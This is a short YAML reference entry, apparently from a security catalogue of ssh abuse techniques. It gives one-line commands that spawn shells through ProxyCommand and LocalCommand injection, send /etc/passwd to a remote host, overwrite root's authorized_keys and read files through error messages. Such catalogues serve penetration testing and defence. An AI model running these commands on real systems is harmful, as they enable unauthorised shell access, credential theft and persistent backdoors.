---
functions:
  shell:
    - description: Spawn interactive shell on client. Does not require a successful connection.
      code: |
        ssh -o ProxyCommand=';sh 0<&2 1>&2' host
    - description: Spawn interactive shell on client. Requires a successful connection towards `host`.
      code: |
        ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
  file-upload:
    - description: Sends a local file (`/etc/passwd`) to a remote SSH server and saves it in a location (`/tmp/out`).
      code: |
        ssh host "cat /tmp/out" < /etc/passwd
  file-download:
    - description: Retrieves a remote file from an SSH server (`/tmp/infile`) and saves it to a local destination (`/root/.ssh/authorized_keys`).
      code: |
        ssh host "cat /tmp/infile" > /root/.ssh/authorized_keys
  file-read:
    - description: Reads a file and outputs it in an error message.
      code: |
        ssh -F /etc/passwd host
  command:
    - description: Does not require a successful connection.
      code: |
        ssh -o ProxyCommand=';uname -a 1>&2' host
---
